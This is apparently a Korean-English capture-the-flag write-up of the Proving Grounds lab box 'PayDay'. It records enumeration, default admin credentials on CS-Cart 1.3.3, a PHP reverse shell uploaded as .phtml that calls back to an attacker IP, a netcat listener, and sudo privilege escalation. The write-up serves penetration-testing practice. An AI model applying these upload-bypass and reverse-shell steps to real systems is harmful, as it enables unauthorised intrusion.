# PayDay

**Platform:** Offensive Security Proving Grounds (PG Practice) **IP:** 192.168.55.39 **Difficulty:** Easy **OS:** Linux (Ubuntu 7.10 - Gutsy Gibbon, Kernel 2.6.22) **Type:** Boot2Root **Date:** 2026-03-30 **Status:** ✅ Rooted

---

## Tags

`#pgpractice` `#linux` `#cscart` `#webshell` `#fileupload` `#rce` `#privesc` `#sudo` `#defaultcreds` `#oscp`

---

## Summary

CS-Cart 1.3.3 쇼핑몰 어플리케이션의 Template Editor를 통해 PHP reverse shell을 업로드하여 초기 접근 획득. `www-data` → `patrick` (기본 크레덴셜) → `root` (sudo ALL) 순서로 권한 상승.

---

## Enumeration

### Port Scan

```bash
nmap -p- --min-rate 10000 -T4 192.168.55.39
```

```
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds
993/tcp open  imaps
995/tcp open  pop3s
```

### Service Scan

```bash
nmap -sC -sV -p 22,80,110,139,143,445,993,995 --min-rate 10000 -T4 192.168.55.39
```

|Port|Service|Version|
|---|---|---|
|22|SSH|OpenSSH|
|80|HTTP|Apache + CS-Cart 1.3.3|
|139/445|SMB|Samba 3.0.26a|
|110/995|POP3/POP3S|Dovecot|
|143/993|IMAP/IMAPS|Dovecot|

### Web Enumeration

```bash
gobuster dir -u http://192.168.55.39 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```

주요 발견:

- `/admin.php` → CS-Cart 관리자 패널
- `/skins/` → 템플릿/스킨 파일 디렉토리
- `/install.php` → 설치 페이지 (노출됨)

### Key Findings

- **CS-Cart 1.3.3** → Authenticated RCE (EDB-48891) — Template Editor 파일 업로드
- **Samba 3.0.26a** → CVE-2007-2447 시도했으나 실패
- Admin 패널 기본 크레덴셜 `admin/admin` 로그인 성공

---

## Exploitation

### Vulnerability

**CS-Cart 1.3.3 — Authenticated RCE via Template Editor File Upload (EDB-48891)**

- 관리자 권한으로 Template Editor에서 `.phtml` 확장자 파일 업로드 가능
- 업로드된 파일이 `/skins/` 경로에서 PHP로 실행됨

### Step 1 — Admin 로그인

```
URL: http://192.168.55.39/admin.php
ID: admin
PW: admin
```

### Step 2 — Reverse Shell 준비

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.phtml
nano shell.phtml
# 수정:
# $ip = '192.168.49.55';
# $port = 4444;
```

> ⚠️ **Note:** `.php` 확장자는 차단됨. `.phtml` 사용해야 실행됨.

### Step 3 — Template Editor에서 업로드

```
http://192.168.55.39/admin.php?target=templates
```

경로: **LOOK AND FEEL → Template editor → Upload file → Browse → shell.phtml → Upload**

### Step 4 — 리스너 & 실행

```bash
# Kali에서
nc -lvnp 4444
```

```
# 브라우저에서
http://192.168.55.39/skins/shell.phtml
```

### Result

```
connect to [192.168.49.55] from (UNKNOWN) [192.168.55.39] 60051
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Privilege Escalation

### www-data → patrick

TTY 업그레이드:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

`/etc/passwd`에서 로컬 유저 확인:

```bash
cat /etc/passwd
# patrick:x:1000:1000:patrick,,,:/home/patrick:/bin/bash
```

기본 크레덴셜로 su:

```bash
su patrick
# Password: patrick
```

### Local Flag

```bash
cat /home/patrick/local.txt
# d22b86b7eb5882af2be5d5496fe4ecb1
```

### patrick → root

```bash
sudo -l
# (ALL) ALL
```

`patrick`이 패스워드 없이 모든 명령 sudo 가능:

```bash
sudo su
# Password: patrick
```

---

## Post Exploitation

### Root Flag

```bash
cat /root/proof.txt
# f5ca5ecc624ad85081fa3ed54bd9ea6b
```

---

## Flags

|Flag|Location|Value|
|---|---|---|
|local.txt|`/home/patrick/local.txt`|`d22b86b7eb5882af2be5d5496fe4ecb1`|
|proof.txt|`/root/proof.txt`|`f5ca5ecc624ad85081fa3ed54bd9ea6b`|

---

## Attack Chain

```
Nmap → CS-Cart admin/admin → Template Editor 파일 업로드
→ shell.phtml RCE → www-data shell
→ su patrick (patrick:patrick) → local.txt
→ sudo -l (ALL) ALL → sudo su → root → proof.txt
```

---

## Failed Attempts

|방법|결과|원인|
|---|---|---|
|Samba usermap_script (CVE-2007-2447)|❌ No session|패치됨 또는 설정 다름|
|SUID PrivEsc|❌ 유용한 바이너리 없음|일반적인 SUID만 존재|

---

## Lessons Learned

- **기본 크레덴셜은 항상 먼저 시도** — admin/admin, user/user, username/username
- CS-Cart처럼 오래된 CMS는 **searchsploit에서 바로 나옴** → EDB 번호 확인 습관
- `.php` 업로드 차단 시 **`.phtml`, `.php5`, `.phar`** 등 우회 확장자 시도
- PrivEsc에서 `/etc/passwd` 유저 목록 확인 후 **username:username** 패턴 꼭 시도
- `sudo -l`에서 **(ALL) ALL** 나오면 즉시 `sudo su`

---

## References

- [Exploit-DB 48891: CS-Cart 1.3.3 Authenticated RCE](https://www.exploit-db.com/exploits/48891)
- GTFOBins: sudo